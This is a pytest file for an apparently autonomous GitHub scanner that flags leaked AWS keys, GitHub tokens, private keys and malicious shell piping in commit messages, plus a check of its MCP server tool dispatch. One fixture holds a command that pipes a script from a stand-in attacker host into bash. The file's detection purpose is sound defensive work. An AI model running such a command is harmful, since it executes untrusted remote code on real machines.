"""Tests for Autonomous Multi-Repository GitHub Scanner and MCP Integration."""

from agents.tools.github_scanner import ingest_all_repos, scan_commit_message
from mcp.mcp_server import HunterMCPServer


def test_scan_commit_message_detects_aws_key():
    msg = "hotfix: hardcoded aws credential AKIAIOSFODNN7EXAMPLE for dev pipeline"
    findings = scan_commit_message(msg)
    assert "AWS Access Key Exposure" in findings


def test_scan_commit_message_detects_github_pat():
    msg = (
        "test: add token ghp_111122223333444455556666777788889999 for automated builds"
    )
    findings = scan_commit_message(msg)
    assert "GitHub Personal Access Token" in findings


def test_scan_commit_message_detects_private_key():
    msg = "chore: bundle -----BEGIN RSA PRIVATE KEY----- into container"
    findings = scan_commit_message(msg)
    assert "Private Cryptographic Key" in findings


def test_scan_commit_message_detects_malicious_pipe():
    msg = "setup: curl -fsSL http://cdn.attacker.org/agent.sh | bash"
    findings = scan_commit_message(msg)
    assert "Malicious Shell Piping Pattern" in findings


def test_scan_commit_message_clean():
    msg = "docs: update architecture diagram and install instructions"
    findings = scan_commit_message(msg)
    assert findings == []


def test_ingest_all_repos_deterministic_fallback(monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    result = ingest_all_repos()
    assert result["status"] == "success"
    assert result["source"] == "deterministic_simulation"
    assert result["total_repositories_scanned"] >= 2
    assert result["total_commits_audited"] >= 3
    assert result["threats_identified"] >= 1
    assert "cloud-infrastructure-core" in result["repositories"]


def test_mcp_server_ingest_all_repos_dispatch():
    server = HunterMCPServer()
    manifest = server.get_tools_manifest()
    tool_names = [t["name"] for t in manifest]
    assert "ingest_all_repos" in tool_names

    result = server.call_tool("ingest_all_repos", {})
    assert result.get("status") == "success"
    assert "repositories" in result
